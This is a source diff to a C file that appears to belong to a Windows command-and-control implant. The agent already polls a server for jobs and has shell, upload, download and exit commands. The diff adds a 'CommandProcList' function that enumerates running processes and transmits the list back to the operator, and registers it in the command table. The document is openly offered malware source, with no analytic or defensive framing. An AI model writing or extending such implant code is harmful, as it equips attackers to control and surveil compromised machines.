@@ -1,11 +1,13 @@
 #include "Command.h"
 #include "Package.h"
 #include <stdio.h>
+#include <tlhelp32.h>
 
 extern UINT32   g_AgentID;
 extern DWORD    g_SleepTime;
 extern BOOL     g_Connected;
 
+#define COMMAND_COUNT 5
 
 VOID TaskParserNew(PTASK_PARSER Parser, PVOID Buffer, UINT32 Size, UINT32 Endian){
     Parser->Buffer = (PUCHAR)Buffer;
@@ -192,17 +194,55 @@ VOID CommandDownload(PTASK_PARSER Parser){
     LocalFree(fileBuf);
 }
 
+VOID CommandProcList(PTASK_PARSER Parser){
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE)
+        return;
+
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(entry);
+
+    DWORD bufSz  = 0x10000;
+    PCHAR result  = (PCHAR)LocalAlloc(LPTR, bufSz);
+    if (!result){ CloseHandle(hSnap); return; }
+
+    int written = wsprintfA(result, "PID    PPID   Name\n---    ----   ----\n");
+
+    if (Process32First(hSnap, &entry)){
+        do {
+            CHAR tmp[300];
+            int len = wsprintfA(tmp, "%-6lu %-6lu %s\n", entry.th32ProcessID, entry.th32ParentProcessID, entry.szExeFile);
+
+            if ((DWORD)(written + len) >= bufSz){
+                bufSz *= 2;
+                result = (PCHAR)LocalReAlloc(result, bufSz, LMEM_MOVEABLE);
+                if (!result) break;
+            }
+            memcpy(result + written, tmp, len);
+            written += len;
+        } while (Process32Next(hSnap, &entry));
+    }
+
+    CloseHandle(hSnap);
+
+    if (result){
+        PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
+        PackageAddBytes(Pkg, (PUCHAR)result, written);
+        PackageTransmit(Pkg, NULL, NULL);
+        LocalFree(result);
+    }
+}
+
 VOID CommandExit(PTASK_PARSER Parser){
     ExitProcess(0);
 }
-
-#define COMMAND_COUNT 4
 
 static COMMAND_ENTRY CommandTable[COMMAND_COUNT] = {
     { .ID = COMMAND_SHELL,    .Function = CommandShell },
     { .ID = COMMAND_UPLOAD,   .Function = CommandUpload },
     { .ID = COMMAND_DOWNLOAD, .Function = CommandDownload },
     { .ID = COMMAND_EXIT,     .Function = CommandExit },
+    { .ID = COMMAND_PROCLIST, .Function = CommandProcList },
 };
 
 VOID CommandDispatcher(VOID){
@@ -219,9 +259,7 @@ VOID CommandDispatcher(VOID){
         Package = PackageCreate(COMMAND_GET_JOB);
         PackageAddInt32(Package, g_AgentID);
 
-        if (!PackageTransmit(Package, &Data, &Size)){
-            break;
-        }
+        if (!PackageTransmit(Package, &Data, &Size)){ break; }
 
         if (!Data || Size < 4)
             break;
